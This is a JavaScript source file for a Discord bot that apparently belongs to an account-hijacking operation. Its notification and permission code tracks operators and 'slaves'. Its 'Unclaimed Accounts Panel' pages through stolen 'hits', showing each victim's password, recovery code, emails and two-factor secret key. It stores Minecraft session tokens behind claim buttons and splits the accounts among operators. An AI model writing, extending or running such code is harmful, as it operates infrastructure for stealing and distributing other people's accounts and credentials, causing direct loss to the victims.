const { Client, EmbedBuilder } = require('discord.js');
const { queryParams } = require("../../db/database");
const { footer } = require("../../config.json")
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const generate = require("../../autosecure/utils/utils/generate");

async function checkNotifications(client) {
  const delay = Date.now() - (15 * 60 * 1000);

  try {
    const rows = await client.queryParams(
      `SELECT * FROM notifications WHERE checked = 0 AND time < ?`,
      [delay]
    );

    for (const notification of rows) {
      try {
        if (notification.checked === 0 && notification.time < delay) {
          const user = await client.users.fetch(notification.userid).catch(() => null);
          if (!user) continue;

          const owner = notification.id.split("|")[0];
          const slave = notification.userid;

          const embed = new EmbedBuilder()
            .setColor(0xADD8E6)
            .setTitle(`User Notification from Bot (\`${owner}\`)`)
            .setDescription('Your settings have been changed!');

          const content = `<@${owner}>'s Bot`;

          await user.send({ content, embeds: [embed] });
          console.log(`Sent notification to user ${notification.userid}`);

          const permsembed = await sendpermissionsembed(client, owner, slave);
          if (permsembed) {
            await user.send(permsembed);
          }

          await client.queryParams(
            `UPDATE notifications SET checked = 1 WHERE id = ?`,
            [notification.id],
            "run"
          );
        }
      } catch (error) {
      //  console.error(`Error processing notification for user ${notification.userid}:`, error);
      }
    }
  } catch (err) {
    console.error("Error querying notifications:", err);
  }
}


async function addnotification(client, userid) {
  let id = `${client.username}|${client.botnumber}`;
  let time = Date.now();
  let checked = 0;

  const existing = await client.queryParams(`SELECT 1 FROM notifications WHERE id = ?`, [id]);

  if (existing.length > 0) {
    await client.queryParams(
      `UPDATE notifications SET userid = ?, time = ?, checked = ? WHERE id = ?`,
      [userid, time, checked, id]
    );
  } else {
    await client.queryParams(
      `INSERT INTO notifications (id, userid, time, checked) VALUES (?, ?, ?, ?)`,
      [id, userid, time, checked]
    );
  }
}

async function sendpermissionsembed(client, owner, slave) {
  let id = owner;
  let embed = {
    title: `User Permissions`,
    color: 0x808080,
    fields: [],
    footer: {
      text: footer.text,
      iconURL: footer.icon_url
    }
  };

  let usersQuery;
  let queryParams1;
  let isOwner = id === owner;

  if (isOwner) {
    usersQuery = `SELECT * FROM users WHERE user_id=?`;
    queryParams1 = [id];
  } else {
    usersQuery = `SELECT * FROM users WHERE user_id=? AND child!=?`;
    queryParams1 = [id, owner];
    embed.footer.text = "You cannot edit your own settings, ask your owner to!";
  }

  let users = await client.queryParams(usersQuery, queryParams1);
  if (users.length === 0) {
    embed.fields.push({
      name: "No Users",
      value: "Use the Add Button to add users using their Discord ID!",
      inline: true
    });
  } else {
    let currentUser = users.find(u => u.child === slave);
    if (!currentUser) {
      embed.fields.push({
        name: "User not found",
        value: "This user is not registered under your account.",
        inline: false
      });
    } else {
      embed.description = `<@${currentUser.child}>`;

      if (isOwner) {
        embed.footer.text = footer.text;
      }

      let claimingStatus = currentUser.claiming == 1 ? "Full" :
        currentUser.claiming == 0 ? "SSID" : "Disabled";

      let restcurrent = currentUser.rest == 0 ? 'SSID' :
        currentUser.rest == -1 ? 'Nothing' :
          currentUser.rest == 1 ? 'Full' : 'Unknown';

      embed.fields.push({
        name: "Claiming type",
        value: claimingStatus,
        inline: true
      });

      embed.fields.push({
        name: "Claiming Split",
        value: `1/${currentUser.split}`,
        inline: true
      });

      embed.fields.push({
        name: "Rest Split",
        value: restcurrent,
        inline: true
      });

      embed.fields.push(
        { name: "Edit Features", value: currentUser.editfeatures == 1 ? "✅" : "❌", inline: true },
        { name: "Edit Settings", value: currentUser.editsettings == 1 ? "✅" : "❌", inline: true },
        { name: "Edit Claiming", value: currentUser.editclaiming == 1 ? "✅" : "❌", inline: true },
        { name: "Edit Responses", value: currentUser.editresponses == 1 ? "✅" : "❌", inline: true },
        { name: "Use Stats Buttons", value: currentUser.usestatsbutton == 1 ? "✅" : "❌", inline: true },
        { name: "Use DM Buttons", value: currentUser.usedmbuttons == 1 ? "✅" : "❌", inline: true }
      );
    }
  }

  return {
    embeds: [embed],
  };
}

function initializeNotificationSystem(client, interval = 30000) {
  checkNotifications(client);
  const intervalId = setInterval(() => checkNotifications(client), interval);
  return intervalId;
}

async function mainclaimembed(client) {
  let embed = new EmbedBuilder()
    .setColor(0xb2c7e0)
    .setDescription("You can see the unclaimed accounts on this panel, manage the auto-claim below so you'll be sent your unclaimed accounts after a specific delay. This will be reported to your users!")
    .setTitle("Unclaimed Accounts Panel");

  const components = [
    new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('autoclaim')
        .setLabel('Change auto-claim delay')
        .setStyle(ButtonStyle.Primary)
    )
  ];

  return { embeds: [embed], components: components };
}

async function sendclaimownerembed(client, currentPage) {
  const unclaimedHits = await client.queryParams(
    "SELECT * FROM unclaimed WHERE user_id = ? ORDER BY date DESC",
    [client.username]
  );

  const uniqueHits = new Map();

  for (const row of unclaimedHits) {
    const data = JSON.parse(row.data);
    const { uid, acc, mcname } = data;
    if (!uniqueHits.has(uid)) {
      uniqueHits.set(uid, { uid, acc, mcname, date: row.date });
    }
  }

  const hitsArray = Array.from(uniqueHits.values());
  const pageSize = 1;
  const totalPages = Math.max(1, Math.ceil(hitsArray.length / pageSize));

  const isMainPage = currentPage === 0 || currentPage === "0";
  const page = isMainPage ? 0 : Math.max(1, Math.min(Number(currentPage), totalPages));

  let embed;
  let components = [];

  if (page === 0) {
    const baseEmbed = await mainclaimembed(client);
    embed = baseEmbed.embeds[0];
    components = baseEmbed.components;
  } else {
    const hit = hitsArray[page - 1];
    if (hit) {
      const securedTimestamp = hit.date;
      const datenow = Math.floor(Date.now() / 1000);
      const secondsAgo = datenow - securedTimestamp;

      const days = Math.floor(secondsAgo / (24 * 60 * 60));
      const hours = Math.floor((secondsAgo % (24 * 60 * 60)) / (60 * 60));
      const minutes = Math.floor((secondsAgo % (60 * 60)) / 60);

      const securedAgo = `${days}d ${hours}h ${minutes}m`;

      const embedBuilder = new EmbedBuilder()
        .setColor(0xb2c7e0)
        .setFields([
          { name: "Username", value: `\`\`\`${hit.acc.oldName}\`\`\``, inline: true },
          { name: "Owns MC", value: `\`\`\`${hit.acc.mc}\`\`\``, inline: true },
          { name: "Capes", value: "```" + (Array.isArray(hit.acc.capes) && hit.acc.capes.length > 0 ? hit.acc.capes.join(", ") : "None") + "```", inline: true },
          { name: "Recovery Code", value: `\`\`\`${hit.acc.recoveryCode}\`\`\``, inline: false },
          { name: "Primary Email", value: `\`\`\`${hit.acc.email}\`\`\``, inline: true },
          { name: "Security Email", value: `\`\`\`${hit.acc.secEmail}\`\`\``, inline: true },
          { name: "Secret Key", value: `\`\`\`${hit.acc.secretkey}\`\`\``, inline: true },
          { name: "Password", value: `\`\`\`${hit.acc.password}\`\`\``, inline: false },
        ])
        .setTitle(`Account secured in ${hit.acc.timeTaken ? Math.round(hit.acc.timeTaken) : "Unknown"} seconds`)
        .setFooter({ text: `Secured ago: ${securedAgo}` });

      embed = embedBuilder;

      const ssidId = generate(32);

      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [ssidId, `ssid|${hit.acc.ssid || ""}${hit.acc.xbl ? `|${hit.acc.xbl}` : ""}`]
      );

      const hitButtons = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId("ssid|" + ssidId + "|" + Date.now())
          .setLabel("SSID")
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`minecraft|${hit.uid}`)
          .setStyle(ButtonStyle.Primary)
          .setLabel("Minecraft"),
        new ButtonBuilder()
          .setCustomId(`email|${hit.acc.secEmail}`)
          .setStyle(ButtonStyle.Secondary)
          .setEmoji("📧"),
        new ButtonBuilder()
          .setCustomId(`auth|${hit.acc.secretkey}`)
          .setStyle(ButtonStyle.Secondary)
          .setEmoji("🔑"),
        new ButtonBuilder()
          .setCustomId(`extrainformation|${hit.uid}`)
          .setEmoji("🔗")
          .setStyle(ButtonStyle.Success)
      );

      components.push(hitButtons);
    } else {
      embed = new EmbedBuilder()
        .setColor(0xb2c7e0)
        .setTitle("No unclaimed hits found.")
        .setTimestamp(Date.now());
    }
  }

  const next = page === 0 ? 1 : (page + 1 > totalPages ? totalPages : page + 1);
  const back = page <= 1 ? 1 : page - 1;
  const fastforward = totalPages;

  const navButtons = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`moveunclaimed|1|fastbackward`)
      .setEmoji({ name: "⏪" })
      .setStyle(ButtonStyle.Primary)
      .setDisabled(page <= 1),
    new ButtonBuilder()
      .setCustomId(`moveunclaimed|${back}|backward`)
      .setEmoji({ name: "◀️" })
      .setStyle(ButtonStyle.Primary)
      .setDisabled(page <= 1),
    new ButtonBuilder()
      .setCustomId(`currentunclaimed`)
      .setLabel(`${page}/${totalPages}`)
      .setStyle(ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId(`moveunclaimed|${next}|forward`)
      .setEmoji({ name: "➡️" })
      .setStyle(ButtonStyle.Primary)
      .setDisabled(page === totalPages),
    new ButtonBuilder()
      .setCustomId(`moveunclaimed|${fastforward}|fastforward`)
      .setEmoji({ name: "⏩" })
      .setStyle(ButtonStyle.Primary)
      .setDisabled(page === totalPages)
  );

  components.unshift(navButtons);

  return { embeds: [embed], components: components, ephemeral: true };
}


module.exports = {
  initializeNotificationSystem,
  checkNotifications,
  addnotification,
  sendpermissionsembed,
  sendclaimownerembed
};
